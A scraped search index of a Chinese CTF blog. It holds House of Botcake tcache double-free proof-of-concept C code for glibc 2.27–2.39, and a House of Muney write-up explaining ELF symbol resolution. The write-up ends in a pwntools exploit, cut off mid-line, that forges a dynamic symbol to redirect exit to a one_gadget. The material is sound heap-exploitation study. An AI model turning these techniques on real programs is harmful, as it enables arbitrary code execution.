


[{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/pwn/heap/","section":"我的博客","summary":"","title":"Basics","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/git/","section":"我的博客","summary":"","title":"Git","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/pwn/heap/house-of-%E7%B3%BB%E5%88%97/house-of/","section":"我的博客","summary":"","title":"House of系列","type":"posts"},{"content":"\rHi there 👋 #\r🐳 Principal Product Manager @ Docker 🐡 Creator and maintainer of Blowfish @ Blowfish page 🚀 Personal blog - n9o.xyz 📚 mentoring @ mentorcruise house of botcake #\r介绍 #\rHouse of botcacke 合理利用了 Tcache 和 Unsortedbin 的机制，同一堆块第一次 Free 进 Unsortedbin 避免了 key 的产生，第二次 Free 进入 Tcache，让高版本的 Tcache Double Free 再次成为可能。\nPOC #\rglibc 2.27 - 2.31 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { intptr_t stack_var[4]; intptr_t *x[7]; for(int i=0; i\u0026lt;sizeof(x)/sizeof(intptr_t*); i++){ x[i] = malloc(0x100); } puts(\u0026#34;Allocating a chunk for later consolidation\u0026#34;); intptr_t *prev = malloc(0x100); puts(\u0026#34;Allocating the victim chunk.\u0026#34;); intptr_t *a = malloc(0x100); printf(\u0026#34;malloc(0x100): a=%p.\\n\u0026#34;, a); puts(\u0026#34;Allocating a padding to prevent consolidation.\\n\u0026#34;); malloc(0x10); // cause chunk overlapping puts(\u0026#34;Now we are able to cause chunk overlapping\u0026#34;); puts(\u0026#34;Step 1: fill up tcache list\u0026#34;); for(int i=0; i\u0026lt;7; i++){ free(x[i]); } puts(\u0026#34;Step 2: free the victim chunk so it will be added to unsorted bin\u0026#34;); free(a); puts(\u0026#34;Step 3: free the previous chunk and make it consolidate with the victim chunk.\u0026#34;); free(prev); puts(\u0026#34;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\\n\u0026#34;); malloc(0x100); free(a);// a is already freed intptr_t *b = malloc(0x120); b[0x120/8-2] = (long)stack_var; malloc(0x100); intptr_t *c = malloc(0x100); printf(\u0026#34;The new chunk is at %p\\n\u0026#34;, c); // sanity check assert(c==stack_var); printf(\u0026#34;Got control on target/stack!\\n\\n\u0026#34;); return 0; } glibc 2.32\u0026ndash;2.39 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { setbuf(stdin, NULL); setbuf(stdout, NULL); // prepare the target intptr_t stack_var[4]; intptr_t *x[7]; for(int i=0; i\u0026lt;sizeof(x)/sizeof(intptr_t*); i++){ x[i] = malloc(0x100); } puts(\u0026#34;Allocating a chunk for later consolidation\u0026#34;); intptr_t *prev = malloc(0x100); puts(\u0026#34;Allocating the victim chunk.\u0026#34;); intptr_t *a = malloc(0x100); printf(\u0026#34;malloc(0x100): a=%p.\\n\u0026#34;, a); puts(\u0026#34;Allocating a padding to prevent consolidation.\\n\u0026#34;); malloc(0x10); for(int i=0; i\u0026lt;7; i++){ free(x[i]); } free(a); free(prev); malloc(0x100); free(a);// a is already freed intptr_t *b = malloc(0x120); puts(\u0026#34;We simply overwrite victim\u0026#39;s fwd pointer\u0026#34;); b[0x120/8-2] = (long)stack_var; // take target out puts(\u0026#34;Now we can cash out the target chunk.\u0026#34;); malloc(0x100); intptr_t *c = malloc(0x100); printf(\u0026#34;The new chunk is at %p\\n\u0026#34;, c); // sanity check assert(c==stack_var); return 0; } 利用思路 #\r申请7个0x100大小的chunk 在申请大小为0x100的chunk1 ，chunk2 free 7个chunk填充tcache free chunk2,chunk1 ，使其进入unsorted bin，并因为连续所以合并。 malloc 0x100，从tache里取出一个free chunk free chunk2 使其进入 tache bin，这样tache bin中就有了unsorted bin中的一块小内存 malloc 0x120 从 unsorted bin中分割出来一块内存，可覆盖chunk2的next指针 伪造next指针 ","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/pwn/heap/house-of-%E7%B3%BB%E5%88%97/house-of/house-of-botcake/","section":"我的博客","summary":"","title":"House of系列","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/pwn/","section":"我的博客","summary":"这是网站的第一篇你帖子","title":"PWN","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/python/","section":"我的博客","summary":"","title":"Python","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/","section":"Tea","summary":"","title":"Tea","type":"page"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/web/","section":"我的博客","summary":"","title":"Web","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/","section":"我的博客","summary":"","title":"我的博客","type":"posts"},{"content":"\rHouse of 系列 #\rhouse of muney #\rELF文件解析 #\r节的结构 #\r静态视图下，组成elf文件的基本单位是section，可以翻译为节。\nelf头会定义节头表(所谓的表，其实都是数组，数组的每个元素都是一个结构体，比如dyn/rel等)\n节头表中定义了节的数量、每个节的类型、起始的虚拟地址。\n与动态链接相关的节为.dynamic节，这里面存储这与动态链接相关的描述信息。\n.dynamic实际是一个数组，数组的每一个元素对应的数据结构为： typedef struct { Elf64_Sxword\td_tag;\t/* Dynamic entry type. 表示的是节的类型 */ union { Elf64_Xword d_val;\t/* Integer value */ Elf64_Addr d_ptr;\t/* Address value */ //这个联合体有时候表示的是这个节处在节表中的下标，有时候表示这个节的虚拟地址 } d_un; } Elf64_Dyn; 与符号查找相关的是STRTAB和SYMTAB节类型。\nSTRTAB：字符串表 ，包含一大串字符串，包含整个程序中所使用到的所有字符。\nSYMTAB：符号表，包含符号的定义，其对应的数据结构为：\ntypedef struct { Elf64_Word st_name; // 符号名在.dynstr中的偏移 unsigned char st_info; // 符号类型（STT_FUNC等）和绑定属性（STB_GLOBAL等） unsigned char st_other; //通常为 0，表示符号可见性为默认（无需修改）。 Elf64_Section st_shndx; // 符号所属的节区索引 Elf64_Addr st_value; // 符号的地址（如函数地址） Elf64_Xword st_size; // 符号大小 } Elf64_Sym; //如果修改st_name这个下标，就能解析出不同的符号地址。 //关于st_value,当符号是一个函数或者变量的时候，这个值就代表符号的虚拟地址，如果开启了PIE，那么符号的实际地址就是加载的基地址加上这个值。 符号类型：符号的绑定属性（st_info字段）分为： STB_LOCAL：局部符号，仅在当前模块可见。 0x0 STB_GLOBAL：全局符号，可被其他模块引用。 0x1 STB_WEAK：弱符号，优先级低于全局符号。 0x2 符号表和字符串表描述了怎么找到符号，但是如何标识哪些符号需要重定位，则需要使用到重定位表。\n重定位表数据结构\ntypedef struct { Elf64_Addr\tr_offset;\t/* Address */ Elf64_Xword\tr_info;\t/* Relocation type and symbol index */ } Elf64_Rel; r_offset：这个值代表对应符号在got表中的地址。使用 libc.got['xxx']得到的就是这个地址。 r_info：有两部分组成，低32位表示重定位入口的类型，高32位表示这个重定位符号在符号表中的下标。 ret2plt流程图\nplt[0]处代码\npush ModuleID jmp _dl_runtime_resolve 第一次调用got表处代码\npush n jmp plt[0] .gnu.hash 节的结构 #\r.gnu.hash 节的结构如下（以64位ELF为例）：\nnbuckets (4字节)：哈希桶的数量。 symndx (4字节)：第一个全局符号在动态符号表（.dynsym）中的索引。 maskwords (4字节)：布隆过滤器掩码的位数（以 _wordsize 为单位）。 shift2 (4字节)：布隆过滤器计算的位移值。 布隆过滤器数组：每个元素大小为 _wordsize 字节（64位下为8字节）。 哈希桶数组：每个桶条目占4字节，指向符号链表的起始索引。 哈希值数组：每个哈希值占4字节。 查找函数符号真实地址流程 #\r调用大概 #\r从 plt 表跳转到 got 表\npush n/push ModuleID，然后跳转到_dl_runtime_resolve 函数。\n上一步实际是找到符号的重定位表条目。在重定位表中，分别记录了解析好地址后需要回填的地址，即符号的 got 表地址，同时记录了符号所在的符号表的下标。\n动态链接器解析符号（如调用exit）\n计算哈希值：对符号名（如\u0026quot;exit\u0026quot;）计算GNU哈希值。 布隆过滤：检查哈希值是否可能存在于哈希表中。 定位哈希桶：根据哈希值找到对应的哈希桶（bucket）。 遍历哈希链： 从桶中获取链的起始索引 chain_index。 实际符号索引 bucket = chain_index + symoffset。 symoffset 是 .dynsym 中第一个全局符号的索引值。 例如，若 .dynsym 前5个符号是局部符号（索引0~4），第6个符号（索引5）是第一个全局符号，则 symoffset = 5。 遍历哈希链，匹配哈希值后，通过索引在 .dynsym 中找到符号条目。 找到符号之后，计算出真实的偏移，然后填回到 got 表，避免下一次重新解析\n调用该函数\n.gnu.hash节中的哈希桶和 .dynsym 节的关系 #\r.gnu.hash 节 .dynsym 节\r+-------------------+ +-------------------+\r| 哈希桶数组 | | Elf64_Sym[0] |\r| buckets[0]: 0 +--------------\u0026gt;| (局部符号，忽略) |\r| buckets[1]: 2 | +-------------------+\r| ... | | Elf64_Sym[1] |\r+-------------------+ | (局部符号，忽略) |\r+-------------------+\r哈希链数组index = bucket - symoffset | Elf64_Sym[bucket] |\r+-------------------+ | (全局符号开始) |\r| hasharr[index]:0xABC | \u0026lt;---------|st_name: \u0026#34;exit\u0026#34; |\r| hasharr[index+1]:0xDEF| | st_value: 0x... |\r+-------------------+ +-------------------+ 细节 #\r涉及的数据结构 #\r.dynamic 实际是一个数组，数组的每一个元素对应的数据结构：\ntypedef struct { Elf64_Sxword\td_tag;\t/* Dynamic entry type */ union { Elf64_Xword d_val;\t/* Integer value */ Elf64_Addr d_ptr;\t/* Address value */ } d_un; } Elf64_Dyn; 符号表的数据结构：\ntypedef struct { Elf64_Word st_name; // 符号名在.dynstr中的偏移 unsigned char st_info; // 符号类型（STT_FUNC等）和绑定属性（STB_GLOBAL等） unsigned char st_other; Elf64_Section st_shndx; // 符号所属的节区索引 Elf64_Addr st_value; // 符号的地址（如函数地址） Elf64_Xword st_size; // 符号大小 } Elf64_Sym; 重定位表的数据结构：\ntypedef struct { Elf64_Addr\tr_offset;\t/* Address */ Elf64_Xword\tr_info;\t/* Relocation type and symbol index */ } Elf64_Rel; link_map的数据结构：\nstruct symtab_cache { // 这里可以包含缓存相关的具体成员，如哈希表、缓存条目等 // 简化示例中暂不详细展开 }; // 表示已找到的版本信息 struct r_found_version { // 这里可以包含版本相关的具体成员，如版本号、版本标志等 // 简化示例中暂不详细展开 }; // 链接映射结构，代表一个已加载的共享对象 struct link_map { // 共享对象加载到内存中的基地址 // 所有共享对象内的相对地址都要加上这个基地址才是实际内存地址 ElfW(Addr) l_addr; // 指向共享对象的绝对文件名的字符串指针 // 用于标识该共享对象是从哪个文件加载的 char *l_name; // 指向共享对象的动态节（.dynamic 节）的指针 // 动态节包含了共享对象动态链接相关的重要信息，如符号表、重定位表位置等 ElfW(Dyn) *l_ld; // 指向下一个加载的共享对象的 link_map 指针 // 用于将所有已加载的共享对象连接成一个双向链表 struct link_map *l_next; // 指向前一个加载的共享对象的 link_map 指针 // 用于将所有已加载的共享对象连接成一个双向链表 struct link_map *l_prev; // 本地符号查找的缓存指针 // 可以提高本地符号查找的效率，减少遍历符号表的次数 struct symtab_cache *l_local_cache; // 全局符号查找的缓存指针 // 可以提高全局符号查找的效率，减少遍历符号表的次数 struct symtab_cache *l_global_cache; l_gnu_chain_zero // 只读重定位（RELRO）段的起始地址 // RELRO 段包含程序加载时已完成重定位的只读数据，有助于提高程序安全性 ElfW(Addr) l_relro_addr; // 只读重定位（RELRO）段的大小 ElfW(Addr) l_relro_size; // 共享对象初始化函数的地址 // 在共享对象加载后，动态链接器会调用此函数进行初始化操作 ElfW(Addr) l_init; // 共享对象终止函数的地址 // 在共享对象卸载前，动态链接器会调用此函数进行清理操作 ElfW(Addr) l_fini; // 指向实际的 link_map // 在某些情况下可能存在代理或虚拟的 link_map，l_real 指向真正的共享对象信息 struct link_map *l_real; // 共享对象的类型，如可执行文件、共享库等 // 可以通过不同的值来区分不同类型的加载对象 int l_type; ... ... }; 细节流程 #\r1.跳转到_dl_runtime_resolve函数后，保存各个寄存器数据，然后call _dl_fixup 这个函数，获取到真实的地址，把地址保存在 r11 寄存器中，把相关数据恢复后，直接 jmp r11。\nDump of assembler code for function _dl_runtime_resolve_xsavec: 0x00007ffff7fe7bc0 \u0026lt;+0\u0026gt;:\tendbr64 0x00007ffff7fe7bc4 \u0026lt;+4\u0026gt;:\tpush rbx 0x00007ffff7fe7bc5 \u0026lt;+5\u0026gt;:\tmov rbx,rsp 0x00007ffff7fe7bc8 \u0026lt;+8\u0026gt;:\tand rsp,0xffffffffffffffc0 0x00007ffff7fe7bcc \u0026lt;+12\u0026gt;:\tsub rsp,QWORD PTR [rip+0x14b35] # 0x7ffff7ffc708 \u0026lt;_rtld_global_ro+232\u0026gt; 0x00007ffff7fe7bd3 \u0026lt;+19\u0026gt;:\tmov QWORD PTR [rsp],rax 0x00007ffff7fe7bd7 \u0026lt;+23\u0026gt;:\tmov QWORD PTR [rsp+0x8],rcx 0x00007ffff7fe7bdc \u0026lt;+28\u0026gt;:\tmov QWORD PTR [rsp+0x10],rdx 0x00007ffff7fe7be1 \u0026lt;+33\u0026gt;:\tmov QWORD PTR [rsp+0x18],rsi 0x00007ffff7fe7be6 \u0026lt;+38\u0026gt;:\tmov QWORD PTR [rsp+0x20],rdi 0x00007ffff7fe7beb \u0026lt;+43\u0026gt;:\tmov QWORD PTR [rsp+0x28],r8 0x00007ffff7fe7bf0 \u0026lt;+48\u0026gt;:\tmov QWORD PTR [rsp+0x30],r9 0x00007ffff7fe7bf5 \u0026lt;+53\u0026gt;:\tmov eax,0xee 0x00007ffff7fe7bfa \u0026lt;+58\u0026gt;:\txor edx,edx 0x00007ffff7fe7bfc \u0026lt;+60\u0026gt;:\tmov QWORD PTR [rsp+0x250],rdx 0x00007ffff7fe7c04 \u0026lt;+68\u0026gt;:\tmov QWORD PTR [rsp+0x258],rdx 0x00007ffff7fe7c0c \u0026lt;+76\u0026gt;:\tmov QWORD PTR [rsp+0x260],rdx 0x00007ffff7fe7c14 \u0026lt;+84\u0026gt;:\tmov QWORD PTR [rsp+0x268],rdx 0x00007ffff7fe7c1c \u0026lt;+92\u0026gt;:\tmov QWORD PTR [rsp+0x270],rdx 0x00007ffff7fe7c24 \u0026lt;+100\u0026gt;:\tmov QWORD PTR [rsp+0x278],rdx 0x00007ffff7fe7c2c \u0026lt;+108\u0026gt;:\txsavec [rsp+0x40] 0x00007ffff7fe7c31 \u0026lt;+113\u0026gt;:\tmov rsi,QWORD PTR [rbx+0x10] 0x00007ffff7fe7c35 \u0026lt;+117\u0026gt;:\tmov rdi,QWORD PTR [rbx+0x8] =\u0026gt; 0x00007ffff7fe7c39 \u0026lt;+121\u0026gt;:\tcall 0x7ffff7fe00c0 \u0026lt;_dl_fixup\u0026gt; 0x00007ffff7fe7c3e \u0026lt;+126\u0026gt;:\tmov r11,rax 0x00007ffff7fe7c41 \u0026lt;+129\u0026gt;:\tmov eax,0xee 0x00007ffff7fe7c46 \u0026lt;+134\u0026gt;:\txor edx,edx 0x00007ffff7fe7c48 \u0026lt;+136\u0026gt;:\txrstor [rsp+0x40] 0x00007ffff7fe7c4d \u0026lt;+141\u0026gt;:\tmov r9,QWORD PTR [rsp+0x30] 0x00007ffff7fe7c52 \u0026lt;+146\u0026gt;:\tmov r8,QWORD PTR [rsp+0x28] 0x00007ffff7fe7c57 \u0026lt;+151\u0026gt;:\tmov rdi,QWORD PTR [rsp+0x20] 0x00007ffff7fe7c5c \u0026lt;+156\u0026gt;:\tmov rsi,QWORD PTR [rsp+0x18] 0x00007ffff7fe7c61 \u0026lt;+161\u0026gt;:\tmov rdx,QWORD PTR [rsp+0x10] 0x00007ffff7fe7c66 \u0026lt;+166\u0026gt;:\tmov rcx,QWORD PTR [rsp+0x8] 0x00007ffff7fe7c6b \u0026lt;+171\u0026gt;:\tmov rax,QWORD PTR [rsp] 0x00007ffff7fe7c6f \u0026lt;+175\u0026gt;:\tmov rsp,rbx 0x00007ffff7fe7c72 \u0026lt;+178\u0026gt;:\tmov rbx,QWORD PTR [rsp] 0x00007ffff7fe7c76 \u0026lt;+182\u0026gt;:\tadd rsp,0x18 0x00007ffff7fe7c7a \u0026lt;+186\u0026gt;:\tbnd jmp r11 End of assembler dump. _dl_fixup函数：\nDL_FIXUP_VALUE_TYPE attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE _dl_fixup ( # ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS ELF_MACHINE_RUNTIME_FIXUP_ARGS, # endif struct link_map *l, ElfW(Word) reloc_arg) { // 这里的l是二进制程序本身的link_map，而不是so的 // 第二个参数即为push n，所查找的符号在重定位表.rel.plt中的索引 // 首先根据link_map中记录的信息，找到动态链接相关的符号表和字符串表 const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]); const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]); // 找到对应的重定位元素、符号表、字符串 const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); const ElfW(Sym) *sym = \u0026amp;symtab[ELFW(R_SYM) (reloc-\u0026gt;r_info)]; const ElfW(Sym) *refsym = sym; // rel_addr 即为got表的地址，在查找到符号真实地址之后会回填到这个地址中 void *const rel_addr = (void *)(l-\u0026gt;l_addr + reloc-\u0026gt;r_offset); lookup_t result; DL_FIXUP_VALUE_TYPE value; /* Sanity check that we\u0026#39;re really looking at a PLT relocation. */ assert (ELFW(R_TYPE)(reloc-\u0026gt;r_info) == ELF_MACHINE_JMP_SLOT); /* Look up the target symbol. If the normal lookup rules are not used don\u0026#39;t look in the global scope. */ if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-\u0026gt;st_other), 0) == 0) { const struct r_found_version *version = NULL; if (l-\u0026gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL) { const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]); ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-\u0026gt;r_info)] \u0026amp; 0x7fff; version = \u0026amp;l-\u0026gt;l_versions[ndx]; if (version-\u0026gt;hash == 0) version = NULL; } /* We need to keep the scope around so do some locking. This is not necessary for objects which cannot be unloaded or when we are not using any threads (yet). */ int flags = DL_LOOKUP_ADD_DEPENDENCY; if (!RTLD_SINGLE_THREAD_P) { THREAD_GSCOPE_SET_FLAG (); flags |= DL_LOOKUP_GSCOPE_LOCK; } #ifdef RTLD_ENABLE_FOREIGN_CALL RTLD_ENABLE_FOREIGN_CALL; #endif // 第一个参数是字符串地址，根据符号表和字符串表得到的 // 第二个参数是link_map // 第三个参数是符号表的地址，是一个栈地址，最后会修正得到的符号表 // 第四个参数是scope，表示查找的范围 // 第五个参数是版本信息 // 后面的参数都是固定的 result = _dl_lookup_symbol_x (strtab + sym-\u0026gt;st_name, l, \u0026amp;sym, l-\u0026gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, NULL); /* We are done with the global scope. */ if (!RTLD_SINGLE_THREAD_P) THREAD_GSCOPE_RESET_FLAG (); #ifdef RTLD_FINALIZE_FOREIGN_CALL RTLD_FINALIZE_FOREIGN_CALL; #endif /* Currently result contains the base load address (or link map) of the object that defines sym. Now add in the symbol offset. */ value = DL_FIXUP_MAKE_VALUE (result, SYMBOL_ADDRESS (result, sym, false)); } else { /* We already found the symbol. The module (and therefore its load address) is also known. */ value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, true)); result = l; } /* And now perhaps the relocation addend. */ value = elf_machine_plt_value (l, reloc, value); if (sym != NULL \u0026amp;\u0026amp; __builtin_expect (ELFW(ST_TYPE) (sym-\u0026gt;st_info) == STT_GNU_IFUNC, 0)) value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value)); /* Finally, fix up the plt itself. */ if (__glibc_unlikely (GLRO(dl_bind_not))) return value; // 修正got表条目 return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value); } 3.调用_dl_lookup_symbol_x 函数 在各个so的link_map寻找对应符号,但是实际调用do_lookup_x函数\nCstatic int __attribute_noinline__ do_lookup_x (const char *undef_name, uint_fast32_t new_hash, unsigned long int *old_hash, const ElfW(Sym) *ref, struct sym_val *result, struct r_scope_elem *scope, size_t i, const struct r_found_version *const version, int flags, struct link_map *skip, int type_class, struct link_map *undef_map) { size_t n = scope-\u0026gt;r_nlist; //r_nlist是动态库link_map的数量，每个动态库都有一个link_map /* Make sure we read the value before proceeding. Otherwise we might use r_list pointing to the initial scope and r_nlist being the value after a resize. That is the only path in dl-open.c not protected by GSCOPE. A read barrier here might be to expensive. */ __asm volatile (\u0026#34;\u0026#34; : \u0026#34;+r\u0026#34; (n), \u0026#34;+m\u0026#34; (scope-\u0026gt;r_list)); struct link_map **list = scope-\u0026gt;r_list;//存放每个link_map的地址数组 do { const struct link_map *map = list[i]-\u0026gt;l_real; //l_real 是 struct link_map 结构体中的一个成员，通常指向该动态链接库实际对应的 link_map。 /* Here come the extra test needed for `_dl_lookup_symbol_skip\u0026#39;. */ if (map == skip) continue; /* Don\u0026#39;t search the executable when resolving a copy reloc. */ if ((type_class \u0026amp; ELF_RTYPE_CLASS_COPY) \u0026amp;\u0026amp; map-\u0026gt;l_type == lt_executable) continue; /* Do not look into objects which are going to be removed. */ if (map-\u0026gt;l_removed) continue; /* Print some debugging info if wanted. */ if (__glibc_unlikely (GLRO(dl_debug_mask) \u0026amp; DL_DEBUG_SYMBOLS)) _dl_debug_printf (\u0026#34;symbol=%s; lookup in file=%s [%lu]\\n\u0026#34;, undef_name, DSO_FILENAME (map-\u0026gt;l_name), map-\u0026gt;l_ns); /* If the hash table is empty there is nothing to do here. */ if (map-\u0026gt;l_nbuckets == 0) continue; Elf_Symndx symidx; int num_versions = 0; const ElfW(Sym) *versioned_sym = NULL; /* The tables for this map. */ // 找到符号表和字符串表（当前link_map） const ElfW(Sym) *symtab = (const void *) D_PTR (map, l_info[DT_SYMTAB]); const char *strtab = (const void *) D_PTR (map, l_info[DT_STRTAB]); const ElfW(Sym) *sym; // 获取bitmask const ElfW(Addr) *bitmask = map-\u0026gt;l_gnu_bitmask; if (__glibc_likely (bitmask != NULL)) { // 获取bitmask_word，这里需要伪造，//bitmask_word用来判断new_hash是否哈希表中 // new_hash的计算：int_fast32_t new_hash = _dl_elf_hash (undef_name); // undef_name 符号名称。 ElfW(Addr) bitmask_word = bitmask[(new_hash / __ELF_NATIVE_CLASS) \u0026amp; map-\u0026gt;l_gnu_bitmask_idxbits]; unsigned int hashbit1 = new_hash \u0026amp; (__ELF_NATIVE_CLASS - 1); unsigned int hashbit2 = ((new_hash \u0026gt;\u0026gt; map-\u0026gt;l_gnu_shift) \u0026amp; (__ELF_NATIVE_CLASS - 1)); if (__glibc_unlikely ((bitmask_word \u0026gt;\u0026gt; hashbit1) \u0026amp; (bitmask_word \u0026gt;\u0026gt; hashbit2) \u0026amp; 1)) { // 获取bucket，这里需要伪造 // 获取符号所在的桶（bucket） // map-\u0026gt;l_gnu_buckets 是 GNU 哈希表的桶数组 // new_hash % map-\u0026gt;l_nbuckets 计算出符号在桶数组中的索引 // 将该索引对应的桶的值赋给 bucket // 这里代码注释提到需要伪造，可能是在某些特殊调试或模拟场景下的情况 Elf32_Word bucket = map-\u0026gt;l_gnu_buckets[new_hash % map-\u0026gt;l_nbuckets]; if (bucket != 0) { // hasharr，这里也需要伪造对应的值 // 这里注释提到 hasharr 需要伪造对应的值，可能是在某些特殊调试或模拟场景下的情况 // 从 GNU 哈希表的链数组中获取当前桶对应的起始位置 // map-\u0026gt;l_gnu_chain_zero 是 GNU 哈希表的链数组起始地址 // bucket 是前面计算得到的符号所在的桶的索引 // 通过 \u0026amp;map-\u0026gt;l_gnu_chain_zero[bucket] 获取该桶对应的链的起始指针 const Elf32_Word *hasharr = \u0026amp;map-\u0026gt;l_gnu_chain_zero[bucket]; // 使用 do-while 循环遍历当前桶对应的链，查找匹配的符号 do if (((*hasharr ^ new_hash) \u0026gt;\u0026gt; 1) == 0) // 根据当前链节点的信息计算符号在符号表中的索引 // ELF_MACHINE_HASH_SYMIDX 是一个宏，用于根据不同的 ELF 机器类型计算符号索引 // map 是当前共享对象的 link_map 结构体指针 // hasharr 是当前链节点的指针 symidx = ELF_MACHINE_HASH_SYMIDX (map, hasharr); // 调用 check_match 函数检查当前符号是否真正匹配要查找的符号 // undef_name 是要查找的未定义符号的名称 // ref 是引用符号的符号表项指针 // version 用于存储找到的符号的版本信息 // flags 是查找标志，控制查找的行为 // type_class 是符号类型类别 // \u0026amp;symtab[symidx] 是当前可能匹配的符号在符号表中的项 // symidx 是符号在符号表中的索引 // strtab 是字符串表指针，用于获取符号名称 // map 是当前共享对象的 link_map 结构体指针 // \u0026amp;versioned_sym 用于存储版本化符号的信息 // \u0026amp;num_versions 用于存储版本数量信息 sym = check_match (undef_name, ref, version, flags, type_class, \u0026amp;symtab[symidx], symidx, strtab, map, \u0026amp;versioned_sym, \u0026amp;num_versions); // 如果 check_match 函数返回非空指针，说明找到了匹配的符号 if (sym != NULL) { // 跳转到 found_it 标签处，进行后续处理 goto found_it; } } // 移动到链中的下一个节点 // (*hasharr++ \u0026amp; 1u) 用于检查当前链节点是否是链中的最后一个节点 // 如果最后一位为 0，则表示不是最后一个节点，继续循环查找 while ((*hasharr++ \u0026amp; 1u) == 0); } } //.... } #\r利用攻击 #\r利用流程 #\rmalloc \u0026gt; 128k的内存 修改该chunk的size，使其大到能覆盖掉libc的一些地址 free该地址 然后malloc 更大的内存 计算当前chunk的地址到libc的地址距离 （调试得出，第一步malloc时，取libc的地址 - (第四步malloc的地址+0x10)） 计算到布隆过滤器(bitmask)数组的偏移 （.gnu.hash的地址 + 16） 计算到哈希桶(bucket)数组的偏移 ( bloom 的偏移 + bloom_size * 8) 计算bitmask_word的在bitmask中index 计算bitmask_word的地址 获取bitmask_word的值 计算目标符号在哈希桶中的index (exit_hash % 桶数(nbucket)) 计算该bucket的地址 获取buket的值，为目标符号在buket中的值。 计算到l_gnu_chain_zero哈希链数组（GNU 哈希表的链数组起始地址）的距离 计算到目标符号的符号表的偏移 伪造符号表的数据结构，将st_value伪造成目标地址，如one_gadget,system的偏移地址。 为什么不直接伪造st_value,在偷libc的地址的时候，偷到的内存会被清空，所以需要重新伪造。\n某题：exp #\rfrom pwn import * elf = ELF(\u0026#34;./pwn\u0026#34;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) io = process(\u0026#34;./pwn\u0026#34;) def add(index, size): io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;1\u0026#34;) io.sendlineafter(b\u0026#34;ID:\u0026#34;, str(index).encode()) io.sendlineafter(b\u0026#34;size:\u0026#34;, str(size).encode()) def free(index): io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;2\u0026#34;) io.sendlineafter(b\u0026#34;remove:\u0026#34;, str(index).encode()) def edit(index, offset, content): io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;3\u0026#34;) io.sendlineafter(b\u0026#34;update:\u0026#34;, str(index).encode()) io.sendlineafter(b\u0026#34;length:\u0026#34;, str(offset).encode()) io.sendafter(b\u0026#34;details:\u0026#34;, content) def show(index): io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;4\u0026#34;) io.sendlineafter(b\u0026#34;view:\u0026#34;, str(index).encode()) def dbg(): gdb.attach(io) pause() add(0, 0x40000 - 0x2000) #dbg() edit(0,-8, p64(0x41002 + 0x5000 + 0x4000)) free(0) add(0, 0x41000 * 2 + 0x4000) base_off = 0x7dff0 one_gadget = [0xe3afe, 0xe3b01, 0xe3b04][1] gnu_hash_section = libc.get_section_by_name(\u0026#39;.gnu.hash\u0026#39;) dynsym_section = libc.get_section_by_name(\u0026#39;.dynsym\u0026#39;) dynstr_section = libc.get_section_by_name(\u0026#39;.dynstr\u0026#39;) namehash = gnu_hash_section.gnu_hash(\u0026#39;exit\u0026#39;) # gnu_hash_section[\u0026#39;sh_addr\u0026#39;]获得gun.hash偏移。 bloom_off = gnu_hash_section[\u0026#39;sh_addr\u0026#39;] + 4 * gnu_hash_section._wordsize bucket_off = bloom_off + gnu_hash_section.params[\u0026#39;bloom_size\u0026#39;] * gnu_hash_section._xwordsize bloom_elem_idx = int(namehash / gnu_hash_section.elffile.elfclass) % gnu_hash_section.params[\u0026#39;bloom_size\u0026#39;] bloom_elem_off = bloom_off + bloom_elem_idx * gnu_hash_section._xwordsize bloom_elem_val = gnu_hash_section.params[\u0026#39;bloom\u0026#39;][bloom_elem_idx] bucket_elem_idx = namehash % gnu_hash_section.params[\u0026#39;nbuckets\u0026#39;] bucket_elem_off = bucket_off + bucket_elem_idx * gnu_hash_section._wordsize bucket_elem_val = gnu_hash_section.params[\u0026#39;buckets\u0026#39;][bucket_elem_idx] hasharr_off = gnu_hash_section._chain_pos + (bucket_elem_val - gnu_hash_section.params[\u0026#39;symoffset\u0026#39;]) * gnu_hash_section._wordsize sym_off = dynsym_section[\u0026#39;sh_offset\u0026#39;] + bucket_elem_val * dynsym_section[\u0026#39;sh_entsize\u0026#39;] sym_value = b\u0026#39;\u0026#39; sym_value += p32(libc.search(b\u0026#39;exit\\x00\u0026#39;).__next__() - dynstr_section[\u0026#39;sh_offset\u0026#39;]) # st_name sym_value += p8(0x12) # st_info 高4位：0x1 表示 